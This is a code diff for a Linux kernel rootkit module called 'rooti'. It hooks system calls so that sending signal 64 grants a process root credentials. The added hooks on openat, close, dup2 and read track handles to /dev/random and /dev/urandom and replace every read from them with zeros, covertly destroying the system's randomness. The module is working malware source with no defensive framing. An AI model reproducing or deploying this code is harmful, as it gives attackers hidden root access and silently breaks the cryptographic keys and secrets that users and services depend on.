@@ -1,7 +1,10 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/types.h>
+#include <linux/string.h>
 #include <linux/cred.h>
+#include <linux/uaccess.h>
 #include "hooking.c"
 
 MODULE_LICENSE("GPL");
@@ -12,7 +15,24 @@ MODULE_VERSION("1.0.0");
 // Unused signal number, used to request a privilege escalation to root
 #define ROOTI_SIG_PE 64
 
+/*
+    This struct stores some file descriptor that is of interest to us which was opened
+    by some usermode process. This struct would be initialized in a hook for some open-like syscall
+    and read in a hook for some read-like or write-like syscall whenever we want to tamper with file I/O.
+*/
+struct rooti_tamper_fd {
+    int fd;                 // file descriptor number
+    pid_t pid;              // PID of the owner
+    struct list_head head;  // linked list head
+};
+
+static LIST_HEAD(rooti_random_tamper_fds);
+
 static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
+static asmlinkage long (*orig_openat)(const struct pt_regs *regs);
+static asmlinkage long (*orig_close)(const struct pt_regs *regs);
+static asmlinkage long (*orig_dup2)(const struct pt_regs *regs);
+static asmlinkage long (*orig_read)(const struct pt_regs *regs);
 
 static int elevate_privilege(void)
 {
@@ -23,7 +43,7 @@ static int elevate_privilege(void)
         return -ENOMEM;
     }
 
-    // Elevate identifiers to those of user & group root
+    // Modify credentials to those of root user & group
     creds->uid.val = creds->gid.val = 0;
     creds->euid.val = creds->egid.val = 0;
     creds->suid.val = creds->sgid.val = 0;
@@ -44,9 +64,115 @@ static asmlinkage long hook_kill(const struct pt_regs *regs)
     return orig_kill(regs);
 }
 
+
+static asmlinkage long hook_openat(const struct pt_regs *regs)
+{
+    struct rooti_tamper_fd *tamper_fd = NULL;
+    char *filepath_user = (char *)regs->si;
+    char *filepath_kernel = kmalloc(NAME_MAX, GFP_KERNEL);
+    if (filepath_kernel == NULL) {
+        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+        return orig_openat(regs);
+    }
+
+    int err = copy_from_user(filepath_kernel, filepath_user, NAME_MAX);
+    if (err > 0) {
+        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
+        kfree(filepath_kernel);
+        return orig_openat(regs);
+    }
+    
+    if (strncmp(filepath_kernel, "/dev/random", NAME_MAX) == 0 || strncmp(filepath_kernel, "/dev/urandom", NAME_MAX) == 0) {
+        pid_t pid = current->pid;
+        int fd = orig_openat(regs);
+
+        // Allocate a new record of an open fd
+        tamper_fd = kmalloc(sizeof(*tamper_fd), GFP_KERNEL);
+        if (tamper_fd == NULL) {
+            printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+            return fd;
+        }
+        tamper_fd->pid = pid;
+        tamper_fd->fd = fd;
+
+        // Append the new record
+        INIT_LIST_HEAD(&tamper_fd->head);
+        list_add_tail(&tamper_fd->head, &rooti_random_tamper_fds);
+
+        kfree(filepath_kernel);
+        return fd;
+    }
+
+    kfree(filepath_kernel);
+    return orig_openat(regs);
+}
+
+static asmlinkage long hook_close(const struct pt_regs *regs)
+{
+    pid_t pid = current->pid;
+    int fd = regs->di;
+
+    struct rooti_tamper_fd *record, *tmp;
+    list_for_each_entry_safe(record, tmp, &rooti_random_tamper_fds, head) {
+        if (pid == record->pid && fd == record->fd) {
+            list_del(&record->head);
+            kfree(record);
+        }
+    }
+    return orig_close(regs);
+}
+
+static asmlinkage long hook_dup2(const struct pt_regs *regs) {
+    pid_t pid = current->pid;
+    int oldfd = regs->di;
+    int newfd = orig_dup2(regs);
+
+    struct rooti_tamper_fd *record;
+    list_for_each_entry(record, &rooti_random_tamper_fds, head) {
+        if (pid == record->pid && oldfd == record->fd) {
+            record->fd = newfd;
+        }
+    }
+
+    return newfd;
+}
+
+static asmlinkage long hook_read(const struct pt_regs *regs) {
+    pid_t pid = current->pid;
+    int fd = regs->di;
+    char *user_buf = (char *)regs->si;
+    size_t count = regs->dx;
+    size_t nread = orig_read(regs);
+    
+    struct rooti_tamper_fd *record;
+    list_for_each_entry(record, &rooti_random_tamper_fds, head)  {
+        if (pid == record->pid && fd == record->fd) {
+            // Allocate kernel buffer filled with zeros
+            char *kernel_buf = kzalloc(count, GFP_KERNEL);
+            if (kernel_buf == NULL) {
+                printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+                return nread;
+            }
+            // Coppy rigged kernel buffer into user buffer
+            int err = copy_to_user(user_buf, kernel_buf, count);
+            if (err > 0) {
+                printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
+                kfree(kernel_buf);
+                return nread;
+            }
+            kfree(kernel_buf);
+        }
+    }
+    return nread;
+}
+
 // List of system calls to hook :D
 struct rooti_syscall_hook hooks[] = {
-    ROOTI_HOOK("sys_kill", hook_kill, &orig_kill)
+    ROOTI_HOOK("sys_kill", hook_kill, &orig_kill),
+    ROOTI_HOOK("sys_openat", hook_openat, &orig_openat),
+    ROOTI_HOOK("sys_close", hook_close, &orig_close),
+    ROOTI_HOOK("sys_dup2", hook_dup2, &orig_dup2),
+    ROOTI_HOOK("sys_read", hook_read, &orig_read)
 };
 
 
@@ -76,6 +202,12 @@ static void __exit rooti_exit(void)
 {
     printk(KERN_INFO "rooti: exit\n");
     rooti_uninstall_hooks(hooks, ARRAY_SIZE(hooks));
+
+    struct rooti_tamper_fd *record, *tmp;
+    list_for_each_entry_safe(record, tmp, &rooti_random_tamper_fds, head) {
+        list_del(&record->head);
+        kfree(record);
+    }
 }
 
 module_init(rooti_init);
